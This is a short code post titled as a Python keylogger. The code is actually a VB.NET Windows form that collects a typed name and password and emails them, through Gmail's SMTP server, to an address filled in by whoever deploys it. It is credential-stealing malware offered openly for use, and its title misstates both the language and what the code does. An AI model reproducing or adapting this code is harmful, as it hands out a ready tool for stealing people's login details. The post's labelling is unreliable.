#keylogger in python

Imports System.Net.Mail
Public Class Form1
'Coded By cyber_warrior_official
Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

End Sub

Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

Dim MyMailMessage As New MailMessage()
Try
            MyMailMessage.From = New MailAddress("1stYOUREMAIL")
            MyMailMessage.To.Add("2ndYOUREMAIL")
            MyMailMessage.Subject = "KEY Log info"
            MyMailMessage.Body = "Name: " & TextBox1.Text & " / Pass: " & TextBox2.Text
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.Port = 587
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("1stYOUREMAIL", "1stYOUREMAILPASSWORD")
            SMTP.Send(MyMailMessage)
        Catch ex As Exception
End Try
End Sub
End Class
